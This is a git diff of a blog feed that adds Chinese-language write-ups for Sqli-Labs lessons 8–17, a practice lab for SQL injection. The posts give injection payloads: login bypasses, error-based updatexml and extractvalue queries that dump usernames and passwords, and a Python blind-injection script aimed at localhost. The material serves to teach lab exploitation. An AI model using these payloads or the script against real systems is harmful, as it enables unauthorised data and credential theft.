@@ -152,9 +152,9 @@
       <category term="随笔" scheme="http://yoursite.com/categories/%E9%9A%8F%E7%AC%94/"/>
     
     
-      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
-    
       <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
     
   </entry>
   
@@ -252,6 +252,229 @@
       <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
     
       <category term="ACM" scheme="http://yoursite.com/tags/ACM/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Sqli-Labs:Less17-writeup</title>
+    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less17-writeup/"/>
+    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less17-writeup/</id>
+    <published>2017-08-23T10:16:52.000Z</published>
+    <updated>2017-08-23T13:46:04.707Z</updated>
+    
+    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
+<p>Less-17 POST-Update Query-Error Based-String<br><a id="more"></a></p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>三种基本语句。</p>
+<h2 id="INSERT"><a href="#INSERT" class="headerlink" title="INSERT"></a>INSERT</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">INSERT INTO table_name ( field1, field2,...fieldN )</div><div class="line">                       VALUES</div><div class="line">                       ( value1, value2,...valueN );</div></pre></td></tr></table></figure>
+<p>示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mysql&gt; desc users;</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">| Field    | Type        | Null | Key | Default | Extra          |</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">| id       | int(3)      | NO   | PRI | NULL    | auto_increment |</div><div class="line">| username | varchar(20) | NO   |     | NULL    |                |</div><div class="line">| password | varchar(20) | NO   |     | NULL    |                |</div><div class="line">+----------+-------------+------+-----+---------+----------------+</div><div class="line">3 rows in set (0.06 sec)</div><div class="line"></div><div class="line">mysql&gt; insert into users(id,username,password) value(0,&quot;chybeta&quot;,&quot;chybeta&quot;);</div><div class="line">Query OK, 1 row affected (0.09 sec)</div></pre></td></tr></table></figure></p>
+<h2 id="UPDATE"><a href="#UPDATE" class="headerlink" title="UPDATE"></a>UPDATE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">UPDATE table_name SET field1=new-value1, field2=new-value2</div><div class="line">[WHERE Clause]</div></pre></td></tr></table></figure>
+<p>示例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select id,username,password from users where id=15;                  </div><div class="line">+----+----------+----------+                                                </div><div class="line">| id | username | password |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">| 15 | chybeta  | chybeta  |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">1 row in set (0.00 sec)                                                     </div><div class="line"></div><div class="line">mysql&gt; update users set username=&quot;atebyhc&quot; where id=15;                     </div><div class="line">Query OK, 1 row affected (0.08 sec)                                         </div><div class="line">Rows matched: 1  Changed: 1  Warnings: 0                                    </div><div class="line"></div><div class="line">mysql&gt; select id,username,password from users where id=15;                  </div><div class="line">+----+----------+----------+                                                </div><div class="line">| id | username | password |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">| 15 | atebyhc  | chybeta  |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">1 row in set (0.00 sec)                                                     </div><div class="line"></div><div class="line">mysql&gt; update users set username=&quot;chybeta&quot;,password=&quot;atebyhc&quot; where id=15;  </div><div class="line">Query OK, 1 row affected (0.00 sec)                                         </div><div class="line">Rows matched: 1  Changed: 1  Warnings: 0                                    </div><div class="line"></div><div class="line">mysql&gt; select id,username,password from users where id=15;                  </div><div class="line">+----+----------+----------+                                                </div><div class="line">| id | username | password |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">| 15 | chybeta  | atebyhc  |                                                </div><div class="line">+----+----------+----------+                                                </div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
+<h2 id="DELETE"><a href="#DELETE" class="headerlink" title="DELETE"></a>DELETE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">DROP TABLE table_name ;</div></pre></td></tr></table></figure>
+<p>这个。。暂时先不演示了。。</p>
+<h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less 17"></a>Less 17</h1><p>这题的题目为：[PASSWORD RESET] 。可以推测后端的语句为UPDATE型，约莫如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">update users set password=新密码 where username=账号；</div></pre></td></tr></table></figure></p>
+<p>我们post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos;&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>则发现有报错回显：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;admin&apos;&apos; at line 1</div></pre></td></tr></table></figure></p>
+<p>为单引号，所以可以推测语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">update users set password=&apos;$password&apos; where username=&apos;$username&apos;；</div></pre></td></tr></table></figure></p>
+<p>接下去进行报错注入。</p>
+<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATEXML (XML_document, XPath_string, new_value);</div></pre></td></tr></table></figure>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值<br>(以上来自<a href="http://www.cnblogs.com/MiWhite/p/6228491.html" target="_blank" rel="external">学习笔记 UpdateXml() MYSQL显错注入</a>)</p>
+<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>可以获取数据库名为：security。</p>
+<p>但要获取数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM users limit 0,1),0x7e),1)#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>却会显示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You can&apos;t specify target table &apos;users&apos; for update in FROM clause</div></pre></td></tr></table></figure></p>
+<p>也就是说不能用update获取当前表的数据，因为update的子查询中不能出现相同的表名。</p>
+<p>这个可以先新建一张表，然后再在这个新建的临时表中进行查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and updatexml(1,concat(0x7e,(SELECT group_concat(0x23,username,0x3a,password,0x23) FROM (select * from users)tmp),0x7e),1)#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>这在sql.log中的语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATE users SET password = &apos;chybeta&apos; and updatexml(1,concat(0x7e,(SELECT group_concat(0x23,username,0x3a,password,0x23) FROM (select * from users)tmp),0x7e),1)#&apos; WHERE username=&apos;admin&apos;</div></pre></td></tr></table></figure></p>
+<p>其中<code>(select * from users)tmp</code>新建了一张tmp表，外面的<code>SELECT...FROM..</code>是从tmp中获取数据。</p>
+<p>updatexml有长度限制,最长32位</p>
+<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,database()))#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>得到数据库名称为 security</p>
+<p>查字段：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns where table_name = &quot;users&quot;)))#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>获取账号密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(0x23,username,0x23,password) FROM (select * from users)tmp)))#&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>对应的后端查询语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">UPDATE users SET password = &apos;chybeta&apos; and extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns where table_name = &quot;users&quot;)))#&apos; WHERE username=&apos;admin&apos;</div></pre></td></tr></table></figure></p>
+<p>extractvalue也有长度限制,最长32位</p>
+<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
+<li><a href="http://static.hx99.net/static/drops/tips-2078.html" target="_blank" rel="external">利用insert，update和delete注入获取数据</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
+&lt;p&gt;Less-17 POST-Update Query-Error Based-String&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Sqli-Labs:Less15~16-writeup</title>
+    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less15-16-writeup/"/>
+    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less15-16-writeup/</id>
+    <published>2017-08-23T09:42:39.000Z</published>
+    <updated>2017-08-23T10:16:14.267Z</updated>
+    
+    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
+<p>Less-15 POST- Blind-Boolian/time Based -Single quotes<br>Less-16 POST- Blind-Boolian/time Based -Double quotes<br><a id="more"></a></p>
+<h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less 15"></a>Less 15</h1><p>这关是盲注。没有回显。</p>
+<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos; and 1=1#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>之后根据页面的登陆与否，即是否有flag.jpg图片出现。构造逻辑语句利用脚本注入。</p>
+<h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less 16"></a>Less 16</h1><p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;) and 1=1#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>登陆成功。</p>
+<p>之后根据页面的登陆与否，构造逻辑语句利用脚本注入。</p>
+<p>下面给个基于Less 16的脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	proxy = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</div><div class="line">	url = <span class="string">"http://localhost:20000/sqllab/Less-16/index.php"</span></div><div class="line">	data = <span class="string">"uname="</span> + payload + <span class="string">"&amp;passwd=chybeta&amp;submit=Submit"</span></div><div class="line">	headers = &#123;<span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>&#125;</div><div class="line">	content = requests.post(url,data=data,headers=headers,proxies=proxy)</div><div class="line">	<span class="keyword">return</span> content.text</div><div class="line">flag = <span class="string">"flag.jpg"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateTarget</span><span class="params">(flag)</span>:</span></div><div class="line">	<span class="keyword">if</span> flag == <span class="string">"database"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"database()"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"tables"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(table_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.TABLES%09WHERE%09TABLE_SCHEMA=0x786d616e)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"columns"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(column_name%09SEPARATOR%090x3c62723e)%09FROM%09INFORMATION_SCHEMA.COLUMNS%09WHERE%09TABLE_NAME=0x6374665f7573657273)"</span></div><div class="line">	<span class="keyword">elif</span> flag == <span class="string">"data"</span>:</div><div class="line">		<span class="keyword">return</span> <span class="string">"(SELECT%09GROUP_CONCAT(gpass%09SEPARATOR%090x3c62723e)%09FROM%09ctf_users)"</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,target)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		payload = <span class="string">'admin") and%09(%09select%09ascii(substr('</span> +generateTarget(target) +<span class="string">"%09from%09"</span>+ str(i) +<span class="string">"%09for%091))&lt;="</span>+str(midNum) +<span class="string">")%23"</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="keyword">if</span> flag <span class="keyword">in</span> recv:</div><div class="line">			doubleSearch(leftNum,midNum,i,target)</div><div class="line"></div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			doubleSearch(midNum,rightNum,i,target)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	i = <span class="number">1</span></div><div class="line">	findBit = <span class="number">0</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"The database:"</span></div><div class="line">	target = <span class="string">"database"</span></div><div class="line">	<span class="keyword">while</span> i :</div><div class="line">		doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,target)</div><div class="line">		i += <span class="number">1</span></div><div class="line">		<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">			sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">			<span class="keyword">break</span></div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170823/10.png?raw=true" alt=""></p>
+<p>注：脚本中的payload的空格我用%90替代了，它对应tab键，可用于绕过对空格的过滤。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
+&lt;p&gt;Less-15 POST- Blind-Boolian/time Based -Single quotes&lt;br&gt;Less-16 POST- Blind-Boolian/time Based -Double quotes&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Sqli-Labs:Less13~14-writeup</title>
+    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less13-14-writeup/"/>
+    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less13-14-writeup/</id>
+    <published>2017-08-23T09:23:54.000Z</published>
+    <updated>2017-08-23T10:05:51.899Z</updated>
+    
+    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
+<p>Less-13 POST- Double Injection -Single quotes -String-with twist<br>Less-14 POST- Double Injection -Single quotes -String-with twist<br><a id="more"></a></p>
+<h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less 13"></a>Less 13</h1><p>当post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>报错语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&apos;) LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
+<p>说明有括号保护，需闭合。</p>
+<p>当post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;)#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>页面返回提示说已经登陆成功。</p>
+<p>后台查询语句为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=(&apos;admin&apos;)#`&apos;) and password=(&apos;chybeta&apos;) LIMIT 0,1</div></pre></td></tr></table></figure></p>
+<h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less 14"></a>Less 14</h1><p>当post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&quot; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
+<p>当post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&quot;&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>报错语句为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;chybeta&quot;&quot; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
+<p>从以上几条语句知道，需要闭合双引号。</p>
+<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>页面返回提示说已经登陆成功。</p>
+<p>后台查询语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=&quot;admin&quot;#&quot; and password=&quot;chybeta&quot; LIMIT 0,1</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
+&lt;p&gt;Less-13 POST- Double Injection -Single quotes -String-with twist&lt;br&gt;Less-14 POST- Double Injection -Single quotes -String-with twist&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>Sqli-Labs:Less11~12-writeup</title>
+    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less11-12-writeup/"/>
+    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less11-12-writeup/</id>
+    <published>2017-08-23T08:47:48.000Z</published>
+    <updated>2017-08-23T10:05:52.704Z</updated>
+    
+    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
+<p>Less-11 POST-Error Based -Single quotes- String<br>Less-12 POST - Error Based -Double quotes - String<br><a id="more"></a><br>考察post注入，所以要借助工具。比如burp。</p>
+<h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less 11"></a>Less 11</h1><p>当post的数据如下时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&apos; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
+<p>当post数据如下时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&amp;passwd=chybeta&apos;&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;chybeta&apos;&apos; LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
+<p>用如下payload即可登陆成功：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&apos;#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>这样后台的语句为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=&apos;admin&apos;#&apos; and password=&apos;chybeta&apos; LIMIT 0,1</div></pre></td></tr></table></figure></p>
+<h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less 12"></a>Less 12</h1><p>和Less 11差不多，将单引号换成双引号。</p>
+<p>post数据为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>报错语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;chybeta&quot;) LIMIT 0,1&apos; at line 1</div></pre></td></tr></table></figure></p>
+<p>发现有括号保护。</p>
+<p>最后的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=admin&quot;)#&amp;passwd=chybeta&amp;submit=Submit</div></pre></td></tr></table></figure></p>
+<p>后台查询语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT username, password FROM users WHERE username=(&quot;admin&quot;)#&quot;) and password=(&quot;chybeta&quot;) LIMIT 0,1</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Sqli-Labs是用来练习sql注入的好平台。project地址：&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;br&gt;本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53&lt;/p&gt;
+&lt;p&gt;Less-11 POST-Error Based -Single quotes- String&lt;br&gt;Less-12 POST - Error Based -Double quotes - String&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Sqli-Labs:Less8~10-writeup</title>
+    <link href="http://yoursite.com/2017/08/23/Sqli-Labs-Less8-10-writeup/"/>
+    <id>http://yoursite.com/2017/08/23/Sqli-Labs-Less8-10-writeup/</id>
+    <published>2017-08-23T07:58:33.000Z</published>
+    <updated>2017-08-23T08:32:00.539Z</updated>
+    
+    <content type="html"><![CDATA[<p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
+<p>Less-8 GET-Blind-Boolean Based- Single Quotes<br>Less-9 GET-Time based - Single Quotes<br>Less-10 GET-Blind-Time based - double quotes<br><a id="more"></a></p>
+<h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less 8"></a>Less 8</h1><p>Less-8 GET-Blind-Boolean Based- Single Quotes<br>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-8/?id=id=-1&apos; or 1=1 %23</div></pre></td></tr></table></figure></p>
+<p>发现有 字符串<code>You are in...........</code></p>
